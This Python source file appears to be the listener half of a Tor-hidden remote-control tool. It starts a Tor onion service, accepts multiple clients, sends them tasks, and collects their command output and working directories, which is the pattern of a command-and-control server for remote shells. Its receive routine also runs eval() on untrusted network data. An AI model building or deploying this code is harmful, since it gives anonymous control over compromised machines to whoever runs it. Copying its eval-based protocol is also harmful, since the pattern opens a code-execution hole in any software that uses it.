import socket
import threading
import sys
from shell_ui.style import Style
import os
import subprocess as sp
import stem.process
import stat

"""
A class to handle the tor process,
and the tor hidden service.
"""
class Tor(Style):
    BASE_DIR = 'hidden_service'
    TORRC_PATH = os.path.join('hidden_service', 'torrc')
    TOR_SOCKS_PORT = 9200

    def __init__(self, name, lPort, fPort):
        self.name = name
        # listen and forward port configured in /etc/tor/torrc
        self.lPort = lPort
        self.fPort = fPort

        # create hidden service directory
        if not os.path.isdir(self.BASE_DIR):
            os.mkdir(self.BASE_DIR)
            # the owner has full permissions over dir
            # equivalent to chmod 700
            os.chmod(self.BASE_DIR, stat.S_IRWXU)

        self.process = self.launch()
        self.posSysMsg('Onion: {}'.format(self.getOnionAddress()))

    def launch(self) -> sp.Popen:
        try:
            torProcess = stem.process.launch_tor_with_config(
                config = {
                    'SocksListenAddress'   : '127.0.0.1:{}'.format(self.TOR_SOCKS_PORT),
                    'SocksPort'            : '{}'.format(self.TOR_SOCKS_PORT),
                    'HiddenServiceDir'     : '{}'.format(self.BASE_DIR),
                    'HiddenServiceVersion' : '3',
                    'HiddenServicePort'    : '{} 127.0.0.1:{}'.format(self.lPort, self.fPort)
                })
        except Exception as error:
            self.negSysMsg('Error while starting tor: {}'.format(error))
            sys.exit(1)
        else:
            self.posSysMsg('Started tor process')
            return torProcess

    def getOnionAddress(self):
        with open(os.path.join(self.BASE_DIR, 'hostname'), 'r') as f:
            # remove \n from hostname file
            return f.read().rstrip()


"""
A class to handle the listener socket.
It also handles the en- and decoding and the network protocoll.
"""
class ListenerSocket(Style, threading.Thread):
    MAX_CONNECTIONS = 10

    def __init__(self, port):
        threading.Thread.__init__(self)
        threading.Thread.daemon = True
        self.bindAddr = ('127.0.0.1', port)
        # <self.__sock> should not be accessed from outside the class.
        self.__sock = self.create()
        self.__clients = []

    def create(self) -> socket.socket:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # allow address reuse
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(self.bindAddr)
            sock.listen(self.MAX_CONNECTIONS)
        except socket.error as error:
            self.negSysMsg(error)
            sys.exit(1)
        else:
            self.posSysMsg('Created socket and bound to hidden service forward port')
            return sock
    """
    The <start> method runs as a thread and endless.
    It handles all incoming client connections and stores the according 
    client objects in <self.__clients>. 
    """
    def run(self):
        self.posSysMsg('Listening for clients') 
        while True:
            try:
                clientObjects = self.__sock.accept()
                client = Client(clientObjects)
                self.__clients.append(client)
                # Dont print any client address info since the connection works over
                # tor hidden services and the address info would be about the exit node.
                print()
                self.posSysMsg('Client connected to the server')
            except socket.error as error:
                self.negSysMsg(error)
                sys.exit(1)

    def getClients(self):
        return self.__clients

    def getClient(self, index):
        try:
            return self.__clients[index]
        except IndexError:
            self.negSysMsg('Client Index out of range.')

    def delClient(self, index):
        try:
            del(self.__clients[index])
        except IndexError:
            self.negSysMsg('Client Index out of range.')

"""
A class the handles the interaction between the listener and the client.
It should NOT be accessed from outside the module.
"""
class Client(Style):
    def __init__(self, clientObjects):
        self.__conn, self.__addr = clientObjects

    """
    The Listener always sends a dictionary containing, 
    A task and a list of optional arguments.
    """
    def send(self, task, args):
        try:
            data = {'task' : task, 'args' : args}
            data = str(data)
            self.__conn.send(data.encode('utf-8'))
        except socket.error as error:
            self.negSysMsg('Error while sending: '.format(error))
            sys.exit(1)
        else:
            self.posSysMsg('==> send {} bytes'.format(sys.getsizeof(data)))

    """
    The client always sends back the output of the current task, 
    and the current working directory as a dictionary.
    """
    def receive(self, buffersize):
        try:
            data = self.__conn.recv(buffersize)
            # get length in bytes before unpacking data
            dataNumBytes = sys.getsizeof(data)
            # decode from bytes to string
            data = data.decode('utf-8')
            # decode from string to dictionary
            data = eval(data)
        except socket.error as error:
            self.negSysMsg('Error while receiving: '.format(error))
            sys.exit(1)
        else:
            self.posSysMsg('<== received {} bytes'.format(dataNumBytes))
            return data['output'], data['cwd']
